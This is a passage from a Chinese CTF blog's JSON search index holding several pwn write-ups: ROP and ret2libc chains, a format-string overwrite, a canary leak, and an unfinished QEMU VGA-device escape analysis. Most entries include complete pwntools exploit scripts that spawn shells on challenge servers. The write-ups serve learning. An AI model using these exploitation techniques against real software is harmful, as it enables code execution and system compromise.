b&#x27;a&#x27;)r.send(payload)print(r.recvline())real_puts_addr = u64(r.recvuntil(b&#x27;\\n&#x27;, drop=True).ljust(8, b&#x27;\\0&#x27;))libc = LibcSearcher(&#x27;puts&#x27;, real_puts_addr)libc_system_addr = libc.dump(&#x27;system&#x27;)libc_shell_addr = libc.dump(&#x27;str_bin_sh&#x27;)libc_puts_addr = libc.dump(&#x27;puts&#x27;)offset = real_puts_addr - libc_puts_addrreal_system_addr = offset + libc_system_addrreal_shell_addr = offset + libc_shell_addrpayload = b&#x27;a&#x27; * (0x40 + 0x08) + p64(pop_rdi_ret_addr) + \\    p64(real_shell_addr) + p64(real_system_addr)payload = payload.ljust(200, b&#x27;a&#x27;)r.send(payload)r.interactive()\n\n\n\n\n\n今天的比赛属实搞人心态，那个pwn的题目一直存在栈未对齐，是我太菜了分析不到原因，等等明天的wp吧。\n","categories":["pwn-xctf"],"tags":["pwn","ROP"]},{"title":"pwn-200","url":"/2021/10/26/pwn-200/","content":"检查保护\n32位，没开canary和PIE\n利用过程int __cdecl main()&#123;  char buf[108]; // [esp+2Ch] [ebp-6Ch] BYREF  strcpy(buf, &quot;Welcome to XDCTF2015~!\\n&quot;);  memset(&amp;buf[24], 0, 0x4Cu);  setbuf(stdout, buf);  write(1, buf, strlen(buf));  sub_8048484();  return 0;&#125;ssize_t sub_8048484()&#123;  char buf[108]; // [esp+1Ch] [ebp-6Ch] BYREF  setbuf(stdin, buf);  return read(0, buf, 0x100u);&#125;\n\n很明显的栈溢出，但是没有直接可以用的system和/bin/sh所以构造rop，这个题跟以往的很烦的一点就是，他的libc文件我用LibcSearcher就是找不到，在找不到的情况下，使用pwntools提供的DynELF来getshell，但是这个好像不能找到字符串所以下面是把字符串写到bss段当中然后执行system就行\nexpfrom pwn import *# r = remote(&#x27;111.200.241.244&#x27;, 51421)r = process(&#x27;./questions/bed0c68697f74e649f3e1c64ff7838b8&#x27;)elf = ELF(&#x27;./questions/bed0c68697f74e649f3e1c64ff7838b8&#x27;)write_plt = elf.plt[&#x27;write&#x27;]read_plt = elf.plt[&#x27;read&#x27;]bss_addr = elf.bss()padding = (0x6c+4)*b&#x27;a&#x27;main_addr = 0x080484BEppp_addr = 0x080485cddef leak(address):    payload = padding+p32(write_plt)+p32(main_addr)+p32(1)+p32(address)+p32(4)    r.sendafter(b&quot;Welcome to XDCTF2015~!\\n&quot;, payload)    return r.recv(4)d = DynELF(leak, elf=elf)sys_addr = d.lookup(b&#x27;system&#x27;, &#x27;libc&#x27;)payload = padding+p32(read_plt)+p32(sys_addr)+p32(0)+p32(bss_addr)+p32(8)r.sendafter(b&quot;Welcome to XDCTF2015~!\\n&quot;, payload)r.send(b&quot;/bin/sh\\x00&quot;)r.interactive()\n","categories":["pwn-xctf"],"tags":["stack overflow"]},{"title":"pwn_实时数据监测","url":"/2021/09/23/pwn-%E5%AE%9E%E6%97%B6%E6%95%B0%E6%8D%AE%E7%9B%91%E6%B5%8B/","content":"程序保护和流程\n啥都没开\n反汇编代码int __cdecl main(int argc, const char **argv, const char **envp)&#123;  locker();  return 0;&#125;\n\nint locker()&#123;  int result; // eax  char s; // [esp+0h] [ebp-208h]  fgets(&amp;s, 0x200, stdin);  imagemagic(&amp;s);  if ( key == 35795746 )    result = system(&quot;/bin/sh&quot;);  else    result = printf(format, &amp;key, key);  return result;&#125;\n\nint __cdecl imagemagic(char *format)&#123;  return printf(format);&#125;\n\n看程序栈 fgets 达不到栈溢出的要求，然后调用了 imagemagic 的函数其实就是调用 printf，第一反应就是格式化字符串漏洞(我中途想着想着就想到栈迁移劫持程序流，我是傻逼)\n然后就是要是 key==35795746 的话就可以 getshell 了。key 是 bss 段上的全局变量会在不等于的时候打印出地址和值\n\n利用过程首先使用\npayload=b&#x27;aaaa_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p&#x27;\n\n\n得出偏移量为 12，但是要是直接搞进去的话程序直接崩溃了。\n解法一按照字节写入\npayload = p32(key_addr)+p32(key_addr+1)+p32(key_addr+2) + \\    p32(key_addr+3)+b&quot;%18c%12$hhn%17c%13$hhn%239c%14$hhn%224c%15$hhn&quot;\n\n所以写入的字节就是\n\n18+4*4=34=0x22 17+34=51=0x33 239+51=290=0x122 224+290=514=0x202\n所以在内存的存储就是\n22 33 22 02\n合并起来就是 0x02223322\n\n解法二直接使用 pwntools 的函数 fmtstr_payload\n最终 exp\nfrom pwn import *context(os=&#x27;Linux&#x27;, arch=&#x27;x86&#x27;, log_level=&#x27;DEBUG&#x27;)elf = ELF(&#x27;./questions/9926c1a194794984978011fc619e3301&#x27;)r = remote(&#x27;111.200.241.244&#x27;, 64783)# r = process(&#x27;./questions/9926c1a194794984978011fc619e3301&#x27;)key_addr = 0x0804a048key_value = 0x02223322# payload = fmtstr_payload(12, &#123;key_addr: key_value&#125;)payload = p32(key_addr)+p32(key_addr+1)+p32(key_addr+2) + \\    p32(key_addr+3)+b&quot;%18c%12$hhn%17c%13$hhn%239c%14$hhn%224c%15$hhn&quot;r.sendline(payload)r.interactive()\n","categories":["pwn-xctf"],"tags":["格式化字符串"]},{"title":"pwn1_sctf_2016","url":"/2021/09/19/pwn1-sctf-2016/","content":"获取程序信息\nNX被打开，没有canary保护栈。\n\n调用一下是这样子的\nIDA静态分析\nmain函数执行了vuln然后看到有get_flag，应该就是在vuln发生栈溢出然后调用get_flag。\nvuln函数的内容:\nint vuln()&#123;  const char *v0; // eax  char s; // [esp+1Ch] [ebp-3Ch]  char v3; // [esp+3Ch] [ebp-1Ch]  char v4; // [esp+40h] [ebp-18h]  char v5; // [esp+47h] [ebp-11h]  char v6; // [esp+48h] [ebp-10h]  char v7; // [esp+4Fh] [ebp-9h]  printf(&quot;Tell me something about yourself: &quot;);  fgets(&amp;s, 32, edata);  std::string::operator=(&amp;input, &amp;s);  std::allocator&lt;char&gt;::allocator(&amp;v5);  std::string::string(&amp;v4, &quot;you&quot;, &amp;v5);  std::allocator&lt;char&gt;::allocator(&amp;v7);  std::string::string(&amp;v6, &quot;I&quot;, &amp;v7);  replace((std::string *)&amp;v3);  std::string::operator=(&amp;input, &amp;v3, &amp;v6, &amp;v4);  std::string::~string((std::string *)&amp;v3);  std::string::~string((std::string *)&amp;v6);  std::allocator&lt;char&gt;::~allocator(&amp;v7);  std::string::~string((std::string *)&amp;v4);  std::allocator&lt;char&gt;::~allocator(&amp;v5);  v0 = (const char *)std::string::c_str((std::string *)&amp;input);  strcpy(&amp;s, v0);  return printf(&quot;So, %s\\n&quot;, &amp;s);&#125;\n\n发现看不懂，完全不知道啥意思，但是可以看到，&amp;s只允许输入32字节的长度，但是栈的情况\ngdb动态分析\n偏移量是64字节，所以无论怎样都无法溢出，然后看见有一个”I”和一个”you”。作为web出生的选手一下子就想到了反序列化因为替换字符导致绕过，这里估计也是一样，然后gdb调式验证一下。\n\n在这里输入五个”I”\n\n可以看到printf答应出来的都是’youyouyouyouyou’了，在栈上也是一样的，变成了五个”you”，从一个字节变到三个字节，找到栈溢出了。\nget_flagexp.py\nfrom pwn import *context(os=&#x27;Linux&#x27;, arch=&#x27;x86&#x27;, log_level=&#x27;debug&#x27;)elf = ELF(&#x27;./questions/pwn1_sctf_2016&#x27;)r = remote(&#x27;node4.buuoj.cn&#x27;, 29915)flag_addr = elf.symbols[&#x27;get_flag&#x27;]payload = b&#x27;I&#x27;*(21)+b&#x27;a&#x27; + p32(flag_addr)# r.recvuntil(&#x27;Tell me something about yourself:&#x27;)r.sendline(payload)r.interactive()\n\n","categories":["pwn-buuctf"],"tags":["stack overflow"]},{"title":"pwn1","url":"/2021/10/27/pwn1/","content":"保护检查\n开启了canary\n执行流程__int64 __fastcall main(int a1, char **a2, char **a3)&#123;  int v3; // eax  char s[136]; // [rsp+10h] [rbp-90h] BYREF  unsigned __int64 v6; // [rsp+98h] [rbp-8h]  v6 = __readfsqword(0x28u);  setvbuf(stdin, 0LL, 2, 0LL);  setvbuf(stdout, 0LL, 2, 0LL);  setvbuf(stderr, 0LL, 2, 0LL);  memset(s, 0, 0x80uLL);  while ( 1 )  &#123;    sub_4008B9();    v3 = sub_400841();    switch ( v3 )    &#123;      case 2:        puts(s);        break;      case 3:        return 0LL;      case 1:        read(0, s, 0x100uLL);        break;      default:        sub_400826(&quot;invalid choice&quot;);        break;    &#125;    sub_400826(&amp;unk_400AE7);  &#125;&#125;\n\n就是选择然后执行相应的内容，很明显在选择1的时候存在栈溢出，但是puts是遇到”\\0”时停止输出，所以可以利用puts泄漏出canary然后栈溢出。思路很简单直接给exp\nfrom pwn import *from LibcSearcher import *elf = ELF(&quot;./questions/babystack&quot;)r = remote(&#x27;111.200.241.244&#x27;, 56538)payload = b&#x27;a&#x27;*(0x90-0x8)pop_rdi_addr = 0x0000000000400a93puts_plt_addr = elf.plt[&#x27;puts&#x27;]puts_got_addr = elf.got[&#x27;puts&#x27;]main_addr = 0x0000000000400908r.recvuntil(b&#x27;&gt;&gt; &#x27;)r.sendline(b&#x27;1&#x27;)r.sendline(payload)r.recvuntil(b&#x27;&gt;&gt; &#x27;)r.sendline(b&#x27;2&#x27;)# print(r.recvuntil(b&#x27;aaaaaaaa\\n&#x27;))r.recvuntil(b&#x27;aaaaaaaa\\n&#x27;)# print((r.recvuntil(b&#x27;\\n&#x27;).ljust(8, b&#x27;\\0&#x27;)))# print(u64(r.recv(7).ljust(8, b&#x27;\\0&#x27;)))canary = u64(r.recv(7).rjust(8, b&#x27;\\0&#x27;))payload += p64(canary)+b&#x27;a&#x27;*0x8+p64(pop_rdi_addr)+p64(puts_got_addr) + \\    p64(puts_plt_addr)+p64(main_addr)r.recvuntil(b&#x27;&gt;&gt; &#x27;)r.sendline(b&#x27;1&#x27;)r.sendline(payload)r.recvuntil(b&#x27;&gt;&gt; &#x27;)r.sendline(b&#x27;3&#x27;)# print(u64(r.recvline()[:-1].ljust(8, b&#x27;\\0&#x27;)))real_puts_addr = u64(r.recvline()[:-1].ljust(8, b&#x27;\\0&#x27;))libc = LibcSearcher(&#x27;puts&#x27;, real_puts_addr)offset = real_puts_addr - libc.dump(&#x27;puts&#x27;)system_addr = libc.dump(&#x27;system&#x27;)+offsetbin_sh_addr = libc.dump(&#x27;str_bin_sh&#x27;)+offsetpayload = b&#x27;a&#x27;*(0x90-0x8)+p64(canary)+b&#x27;a&#x27;*0x8 + \\    p64(pop_rdi_addr)+p64(bin_sh_addr)+p64(system_addr)r.recvuntil(b&#x27;&gt;&gt; &#x27;)r.sendline(b&#x27;1&#x27;)r.sendline(payload)r.recvuntil(b&#x27;&gt;&gt; &#x27;)r.sendline(b&#x27;3&#x27;)r.interactive()\n\n","categories":["pwn-xctf"],"tags":["canary"]},{"title":"q-escape","url":"/2023/03/15/q-escape/","content":"许久没有更新，前段时间一直考试所以一直拖着了。\n设备分析首先看看开了什么保护\n➜  q-escape checksec --file=./qemu-system-x86_64 [*] &#x27;/media/psf/Home/Documents/pwn/qemu_escape/q-escape/qemu-system-x86_64&#x27;    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      No PIE (0x400000)    FORTIFY:  Enabled\n\n没有开启PIE\n#!/bin/sh./qemu-system-x86_64 \\\t-m 64 \\\t-initrd ./initramfs.igz \\\t-kernel ./vmlinuz-4.15.0-36-generic \\\t-append &quot;priority=low console=ttyS0&quot; \\\t-nographic \\\t-L ./pc-bios \\\t-vga std \\\t-device cydf-vga \\\t-monitor telnet:127.0.0.1:2222,server,nowait\n\n设备名为cydf-vga并且允许连接。\n将qemu-system-x86_64拖入ida中，查找与设备cydf-vga相关的函数。\n\n先分析cydf_vga_class_init初始化函数：\nvoid __fastcall cydf_vga_class_init(ObjectClass_0 *klass, void *data)&#123;  PCIDeviceClass *v2; // rbx  PCIDeviceClass *v3; // rax  v2 = (PCIDeviceClass *)object_class_dynamic_cast_assert(                           klass,                           &quot;device&quot;,                           &quot;/home/dr0gba/pwn/seccon/qemu-3.0.0/hw/display/cydf_vga.c&quot;,                           3223,                           &quot;cydf_vga_class_init&quot;);  v3 = (PCIDeviceClass *)object_class_dynamic_cast_assert(                           klass,                           &quot;pci-device&quot;,                           &quot;/home/dr0gba/pwn/seccon/qemu-3.0.0/hw/display/cydf_vga.c&quot;,                           3224,                           &quot;cydf_vga_class_init&quot;);  v3-&gt;realize = pci_cydf_vga_realize;  v3-&gt;romfile = &quot;vgabios-cydf.bin&quot;;  v3-&gt;vendor_id = 0x1013;  v3-&gt;device_id = 0xB8;  v3-&gt;class_id = 0x300;  v2-&gt;parent_class.desc = &quot;Cydf CLGD 54xx VGA&quot;;  v2-&gt;parent_class.categories[0] |= 0x20uLL;  v2-&gt;parent_class.vmsd = &amp;vmstate_pci_cydf_vga;  v2-&gt;parent_class.props = pci_vga_cydf_properties;  v2-&gt;parent_class.hotpluggable = 0;&#125;\n\n可以看到device_id为0xB8，vendor_id为0x1013，class_id为0x300。并且可以看到父类的描述为Cydf CLGD 54xx VGA。合理猜测是根据原本的改的。\n➜  display git:(master) grep -r &#x27;CLGD 54xx VGA&#x27; ./ ./cirrus_vga_rop.h: * QEMU Cirrus CLGD 54xx VGA Emulator../cirrus_vga_isa.c: * QEMU Cirrus CLGD 54xx VGA Emulator, ISA bus support./cirrus_vga_internal.h: * QEMU Cirrus CLGD 54xx VGA Emulator, ISA bus support./cirrus_vga_rop2.h: * QEMU Cirrus CLGD 54xx VGA Emulator../cirrus_vga.c: * QEMU Cirrus CLGD 54xx VGA Emulator../cirrus_vga.c:    dc-&gt;desc = &quot;Cirrus CLGD 54xx VGA&quot;;\n\n事实也是这样的。\n/ # lspci00:00.0 Class 0600: 8086:123700:01.3 Class 0680: 8086:711300:03.0 Class 0200: 8086:100e00:01.1 Class 0101: 8086:701000:02.0 Class 0300: 1234:111100:01.0 Class 0601: 8086:700000:04.0 Class 0300: 1013:00b8 &lt;-- cydf_vga\n\n/ # cat /sys/bus/pci/devices/0000\\:00\\:04.0/resource0x00000000fa000000 0x00000000fbffffff 0x00000000000422080x00000000febc1000 0x00000000febc1fff 0x00000000000402000x0000000000000000 0x0000000000000000 0x00000000000000000x0000000000000000 0x0000000000000000 0x00000000000000000x0000000000000000 0x0000000000000000 0x00000000000000000x0000000000000000 0x0000000000000000 0x00000000000000000x00000000febb0000 0x00000000febbffff 0x00000000000462000x0000000000000000 0x0000000000000000 0x00000000000000000x0000000000000000 0x0000000000000000 0x00000000000000000x0000000000000000 0x0000000000000000 0x00000000000000000x0000000000000000 0x0000000000000000 0x00000000000000000x0000000000000000 0x0000000000000000 0x00000000000000000x0000000000000000 0x0000000000000000 0x0000000000000000\n\n通过这里可以看到三个mmio空间。通过交叉引用，可以找到哪里注册了IO\n\nmemory_region_init_io(&amp;s-&gt;cydf_vga_io, owner, &amp;cydf_vga_io_ops, s, &quot;cydf-io&quot;, 0x30uLL);memory_region_init_io(&amp;s-&gt;low_mem, owner, &amp;cydf_vga_mem_ops, s, &quot;cydf-low-memory&quot;, 0x20000uLL);memory_region_init_io(&amp;s-&gt;cydf_mmio_io, owner, &amp;cydf_mmio_io_ops, s, &quot;cydf-mmio&quot;, 0x1000uLL);\n\n这里关注与cydf相关的空间注册，根据大小来看第一个就是pmio，只不过在resource文件内没有范围\n/ # cat /proc/ioports 0000-0cf7 : PCI Bus 0000:00  0000-001f : dma1  0020-0021 : pic1  0040-0043 : timer0  0050-0053 : timer1  0060-0060 : keyboard  0064-0064 : keyboard  0070-0071 : rtc0  0080-008f : dma page reg  00a0-00a1 : pic2  00c0-00df : dma2  00f0-00ff : fpu  0170-0177 : 0000:00:01.1    0170-0177 : ata_piix  01f0-01f7 : 0000:00:01.1    01f0-01f7 : ata_piix  0376-0376 : 0000:00:01.1    0376-0376 : ata_piix  03c0-03df : vga+  03f6-03f6 : 0000:00:01.1    03f6-03f6 : ata_piix  03f8-03ff : serial  0510-051b : QEMU0002:00  0600-063f : 0000:00:01.3    0600-0603 : ACPI PM1a_EVT_BLK    0604-0605 : ACPI PM1a_CNT_BLK    0608-060b : ACPI PM_TMR  0700-070f : 0000:00:01.30cf8-0cff : PCI conf10d00-ffff : PCI Bus 0000:00  afe0-afe3 : ACPI GPE0_BLK  c000-c03f : 0000:00:03.0  c040-c04f : 0000:00:01.1    c040-c04f : ata_piix\n\n可以看到这里存在一个大小刚好为0x30的vga+的端口范围。\n\n根据定义的函数来看我们还需要找到vga的映射空间，通过这篇文章vgamem可以得知vga的映射空间为000a0000-000bffff\n/ # cat /proc/iomem 00000000-00000fff : Reserved00001000-0009fbff : System RAM0009fc00-0009ffff : Reserved000a0000-000bffff : PCI Bus 0000:00000c0000-000c97ff : Video ROM000c9800-000ca5ff : Adapter ROM000ca800-000cadff : Adapter ROM000f0000-000fffff : Reserved  000f0000-000fffff : System ROM00100000-03fdffff : System RAM  01000000-01c031d0 : Kernel code  01c031d1-0266a03f : Kernel data  028e2000-02b3dfff : Kernel bss03fe0000-03ffffff : Reserved04000000-febfffff : PCI Bus 0000:00  fa000000-fbffffff : 0000:00:04.0  fc000000-fcffffff : 0000:00:02.0  feb40000-feb7ffff : 0000:00:03.0  feb80000-feb9ffff : 0000:00:03.0  febb0000-febbffff : 0000:00:04.0  febc0000-febc0fff : 0000:00:02.0  febc1000-febc1fff : 0000:00:04.0fec00000-fec003ff : IOAPIC 0fed00000-fed003ff : HPET 0  fed00000-fed003ff : PNP0103:00fee00000-fee00fff : Local APICfffc0000-ffffffff : Reserved100000000-17fffffff : PCI Bus 0000:00\n\n通过注册的大小和所看到的其实地址可以确定是这里000a0000-000bffff : PCI Bus 0000:00。\n并且在源码中也有\n/*************************************** * *  memory access between 0xa0000-0xbffff * ***************************************/\n\n可以看到vga_mem空间在resource文件中并不存在，所以无法像前面一道题一样使用resource0文件去访问内存了。这时我们可以利用/dev/mem文件，dev/mem是物理内存的全映像，可以用来访问物理内存，用mmap来访问物理内存以及外设的IO资源，是实现用户空间驱动的一种方法。\nsystem( &quot;mknod -m 660 /dev/mem c 1 1&quot; );int fd = open( &quot;/dev/mem&quot;, O_RDWR | O_SYNC );if ( fd == -1 ) &#123;    return 0;&#125;mmio_mem = mmap( NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0xfebc1000 );if ( !mmio_mem ) &#123;    die(&quot;mmap mmio failed&quot;);&#125;vga_mem = mmap( NULL, 0x20000, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0xa0000 );if ( !vga_mem ) &#123;    die(&quot;mmap vga mem failed&quot;);&#125;\n\n函数分析根据上一道题的流程来看，这里需要分析分析结构体了。\n\n在对比两个结构体的结果发现了源文件中不存在VulnState_0 vs[16];uint32_t latch[4];这样两个属性。并且还明显的说了是VulnState_0。通过源码对比发现，源码中考虑地址的情况只有addr &lt; 0x10000，addr &gt;= 0x18000 &amp;&amp; addr &lt; 0x18100\n但是这里存在一个新的，也就是大于0x18100的情况。\nv5 = opaque-&gt;vga.sr[0xCC] % 5u;if ( *(_WORD *)&amp;opaque-&gt;vga.sr[0xCD] )  LODWORD(mem_value) = (opaque-&gt;vga.sr[0xCD] &lt;&lt; 16) | (opaque-&gt;vga.sr[0xCE] &lt;&lt; 8) | mem_value;if ( v5 == 2 )&#123;  v21 = BYTE2(mem_value);  if ( v21 &lt;= 0x10 &amp;&amp; opaque-&gt;vs[v21].buf )    __printf_chk(1LL);&#125;else&#123;  if ( v5 &lt;= 2u )  &#123;    if ( v5 == 1 )    &#123;      if ( BYTE2(mem_value) &gt; 0x10uLL )        return;      v6 = (char *)opaque + 16 * BYTE2(mem_value);      v7 = *((_QWORD *)v6 + 0x267B);      if ( !v7 )        return;      v8 = *((unsigned int *)v6 + 0x4CF9);      if ( (unsigned int)v8 &gt;= *((_DWORD *)v6 + 0x4CF8) )        return;      LABEL_26:      *((_DWORD *)v6 + 0x4CF9) = v8 + 1;      *(_BYTE *)(v7 + v8) = mem_value;      return;    &#125;    goto LABEL_35;  &#125;  if ( v5 != 3 )  &#123;    if ( v5 == 4 )    &#123;      if ( BYTE2(mem_value) &gt; 0x10uLL )        return;      v6 = (char *)opaque + 16 * BYTE2(mem_value);      v7 = *((_QWORD *)v6 + 0x267B);      if ( !v7 )        return;      v8 = *((unsigned int *)v6 + 19705);      if ( (unsigned int)v8 &gt; 0xFFF )        return;      goto LABEL_26;    &#125;    LABEL_35:    v17 = vulncnt;    if ( vulncnt &lt;= 0x10 &amp;&amp; (unsigned __int16)mem_value &lt;= 0x1000uLL )    &#123;      mem_valuea = mem_value;      v18 = malloc((unsigned __int16)mem_value);      v19 = (char *)opaque + 16 * v17;      *((_QWORD *)v19 + 9851) = v18;      if ( v18 )      &#123;        vulncnt = v17 + 1;        *((_DWORD *)v19 + 19704) = mem_valuea;      &#125;    &#125;    return;  &#125;  if ( BYTE2(mem_value) &lt;= 0x10uLL )  &#123;    v20 = (char *)opaque + 16 * BYTE2(mem_value);    if ( *((_QWORD *)v20 + 9851) )    &#123;      if ( (unsigned __int16)mem_value &lt;= 0x1000u )        *((_QWORD *)v20 + 9852) = (unsigned __int16)mem_value;    &#125;  &#125;&#125;\n\n逆向之后会发现这里其实就是一个堆题，总共有五个选项\nv5==0时，opaque-&gt;vs[idx].buf = malloc(mem_value &amp; 0xfff); max_size == mem_value &amp; 0xfffv5==1时，当cur_size &lt; max_size时，opaque-&gt;vs[idx].buf[cur_size++] = mem_value &amp; 0xffv5==2时，printf_chk(1, opaque-&gt;vs[idx].buf)v5==3时，opaque-&gt;vs[idx].max_size = mem_value &amp; 0xfffv5==4时，opaque-&gt;vs[idx].buf[cur_size++] = mem_value &amp; 0xff\n\n需要吐槽的是，这两次汇编语言表达的意思一样但是表达的形式不一样，所以莫名其妙的需要依靠汇编来逆向。\n.text:000000000068F521 48 81 C2 3D 13 00 00          add     rdx, 133Dh.text:000000000068F528 48 C1 E2 04                   shl     rdx, 4.text:000000000068F52C 48 8B 74 13 08                mov     rsi, [s+rdx+8].text:000000000068F531 48 85 F6                      test    rsi, rsi.text:000000000068F534 0F 84 24 FD FF FF             jz      loc_68F25E.text:000000000068F534.text:000000000068F53A 48 83 C4 18                   add     rsp, 18h.text:000000000068F53E BF 01 00 00 00                mov     edi, 1.text:000000000068F543 31 C0                         xor     eax, eax.text:000000000068F545 5B                            pop     s.text:000000000068F546 5D                            pop     rbp.text:000000000068F547 E9 F4 99 D7 FF                jmp     ___printf_chk······.text:000000000068F47B 48 89 E9                      mov     rcx, rbp.text:000000000068F47E 48 C1 E1 04                   shl     rcx, 4.text:000000000068F482 48 01 CB                      add     s, rcx.text:000000000068F485 48 85 C0                      test    rax, rax.text:000000000068F488 48 89 83 D8 33 01 00          mov     [rbx+133D8h], rax.text:000000000068F48F 0F 84 C9 FD FF FF             jz      loc_68F25E.text:000000000068F48F.text:000000000068F495 48 8B 54 24 08                mov     rdx, qword ptr [rsp+28h+chunk_size].text:000000000068F49A 48 83 C5 01                   add     rbp, 1.text:000000000068F49E 48 89 2D 3B A0 A3 00          mov     cs:vulncnt, rbp.text:000000000068F4A5 81 E2 FF FF 00 00             and     edx, 0FFFFh.text:000000000068F4AB 89 93 E0 33 01 00             mov     [rbx+133E0h], edx.text:000000000068F4B1 E9 A8 FD FF FF                jmp     loc_68F25E\n\n上面可以看到漏洞点是v5 == 4时，对cur_size没有检测，可以实现堆溢出，当然我感觉三可以修改最大size配合二也是可以实现堆溢出，但是直接用四即可实现所以也没必要再去搞三二了。\n再就是存在一个大的问题就是，上面所有对idx的验证就是小于等于16，所以这一出也就导致我们可以溢出到下一个成员latch\nuint64_t __fastcall cydf_vga_mem_read(CydfVGAState *opaque, hwaddr addr, uint32_t size)&#123;  uint32_t v3; // eax  bool v4; // zf  uint64_t result; // rax  char *v6; // rcx  unsigned int v7; // edx  unsigned int v8; // edx  v3 = opaque-&gt;latch[0];  if ( !(_WORD)v3 )  &#123;    v4 = (opaque-&gt;vga.sr[7] &amp; 1) == 0;    opaque-&gt;latch[0] = addr | v3;    if ( !v4 )      goto LABEL_3;    return vga_mem_readb(&amp;opaque-&gt;vga, addr);  &#125;  v4 = (opaque-&gt;vga.sr[7] &amp; 1) == 0;  opaque-&gt;latch[0] = (_DWORD)addr &lt;&lt; 16;  if ( v4 )    return vga_mem_readb(&amp;opaque-&gt;vga, addr);LABEL_3:  if ( addr &gt; 0xFFFF )  &#123;    result = 255LL;    if ( addr - 0x18000 &lt;= 0xFF &amp;&amp; (opaque-&gt;vga.sr[23] &amp; 0x44) == 4 )      return cydf_mmio_blt_read(opaque, (unsigned __int8)addr);  &#125;  else  &#123;    result = 0xFFLL;    v6 = (char *)opaque + 4 * (addr &gt;&gt; 15);    v7 = addr &amp; 0x7FFF;    if ( v7 &lt; *((_DWORD *)v6 + 0x44D5) )    &#123;      v8 = *((_DWORD *)v6 + 0x44D3) + v7;      if ( (opaque-&gt;vga.gr[11] &amp; 0x14) == 20 )      &#123;        v8 *= 16;      &#125;      else if ( (opaque-&gt;vga.gr[11] &amp; 2) != 0 )      &#123;        v8 *= 8;      &#125;      return opaque-&gt;vga.vram_ptr[opaque-&gt;cydf_addr_mask &amp; v8];    &#125;  &#125;  return result;&#125;\n\n而在这个函数中其实是可以控制latch[0]的值的。\nswitch ( (char)sr_index )&#123;  case 0:  case 1:  case 2:  case 3:  case 4:    opaque-&gt;vga.sr[(unsigned __int8)sr_index] = sr_mask[(unsigned __int8)sr_index] &amp; v4;    if ( (_BYTE)sr_index == 1 )      goto LABEL_35;    break;  case 6:    opaque-&gt;vga.sr[6] = 3 * ((v4 &amp; 0x17) == 18) + 15;    break;  case 7:    cydf_update_memory_access(opaque);    sr_index = opaque-&gt;vga.sr_index;    goto LABEL_28;  case 8:  case 9:  case 0xA:  case 0xB:  case 0xC:  case 0xD:  case 0xE:  case 0xF:  case 0x13:  case 0x14:  case 0x15:  case 0x16:  case 0x18:  case 0x19:  case 0x1A:  case 0x1B:  case 0x1C:  case 0x1D:  case 0x1E:  case 0x1F:  case 0xCC:  case 0xCD:  case 0xCE:    LABEL_28:    opaque-&gt;vga.sr[sr_index] = v4;    break;&#125;\n\n而在这里我们正好可以控制opaque-&gt;vga.sr[0xCC]的值。\nint qemu_log(const char *fmt, ...)&#123;  __int64 v1; // rdx  __int64 v2; // rcx  __int64 v3; // rsi  __int64 v4; // r8  __int64 v5; // r9  int ret; // [rsp+1Ch] [rbp-D4h]  gcc_va_list va; // [rsp+20h] [rbp-D0h] BYREF  unsigned __int64 v9; // [rsp+38h] [rbp-B8h]  __int64 v10; // [rsp+48h] [rbp-A8h]  __int64 v11; // [rsp+50h] [rbp-A0h]  __int64 v12; // [rsp+58h] [rbp-98h]  __int64 v13; // [rsp+60h] [rbp-90h]  __int64 v14; // [rsp+68h] [rbp-88h]  va_start(va, fmt);  v3 = va_arg(va, _QWORD);  v1 = va_arg(va, _QWORD);  v2 = va_arg(va, _QWORD);  v4 = va_arg(va, _QWORD);  v5 = va_arg(va, _QWORD);  va_end(va);  v10 = v3;  v11 = v1;  v12 = v2;  v13 = v4;  v14 = v5;  v9 = __readfsqword(0x28u);  ret = 0;  if ( qemu_logfile )  &#123;    va_start(va, fmt);    va_arg(va, _QWORD);    va_arg(va, _QWORD);    va_arg(va, _QWORD);    va_arg(va, _QWORD);    va_arg(va, _QWORD);    ret = vfprintf(qemu_logfile, fmt, va);    if ( ret &lt; 0 )      return 0;  &#125;  return ret;&#125;\n\n在qemu_log函数中，存在一个vfprintf函数调用了bss上的一个变量qemu_logfile。那么利用思路如下：\n\n  修改qemu_logfile的内容为cat /flag\n  修改vfprintf函数的got表为system\n  修改printf_chk函数的got表为qemu_log\n  最后让v5等于2，触发printf_chk\n\n漏洞利用先吐槽一点\nswitch ( addr )&#123;  case 4uLL:  case 0x24uLL:  opaque-&gt;vga.cr_index = value;  break;  case 5uLL:  case 0x25uLL:  cr_index = opaque-&gt;vga.cr_index;  if ( (unsigned __int8)cr_index &lt;= 0x18u )  &#123;  if ( (opaque-&gt;vga.cr[17] &amp; 0x80u) == 0 || (unsigned __int8)cr_index &gt; 7u )  &#123;  opaque-&gt;vga.cr[(unsigned __int8)cr_index] = value;  if ( (_BYTE)cr_index != 24 &amp;&amp; ((1LL &lt;&lt; cr_index) &amp; 0x8200F1) != 0 )  LABEL_35:  opaque-&gt;vga.update_retrace_info((VGACommonState *)opaque);  &#125;  else if ( (_BYTE)cr_index == 7 )  &#123;  opaque-&gt;vga.cr[7] = value &amp; 0x10 | opaque-&gt;vga.cr[7] &amp; 0xEF;  &#125;  &#125;  else if ( (unsigned __int8)cr_index &lt;= 0x1Du )  &#123;  opaque-&gt;vga.cr[cr_index] = value;  &#125;  break;  case 0xAuLL:  case 0x2AuLL:  opaque-&gt;vga.fcr = value &amp; 0x10;  break;  case 0x10uLL:  ar_flip_flop = opaque-&gt;vga.ar_flip_flop;  if ( ar_flip_flop )  &#123;  v13 = opaque-&gt;vga.ar_index &amp; 0x1F;  switch ( opaque-&gt;vga.ar_index &amp; 0x1F )  &#123;  case 0:  case 1:  case 2:  case 3:  case 4:  case 5:  case 6:  case 7:  case 8:  case 9:  case 0xA:  case 0xB:  case 0xC:  case 0xD:  case 0xE:  case 0xF:  case 0x12:  opaque-&gt;vga.ar[v13] = value &amp; 0x3F;  break;  case 0x10:  opaque-&gt;vga.ar[v13] = value &amp; 0xEF;  break;  case 0x11:  goto LABEL_42;  case 0x13:  case 0x14:  LOBYTE(value) = value &amp; 0xF;  LABEL_42:  opaque-&gt;vga.ar[v13] = value;  break;  default:  break;  &#125;  &#125;  else  &#123;  opaque-&gt;vga.ar_index = value &amp; 0x3F;  &#125;  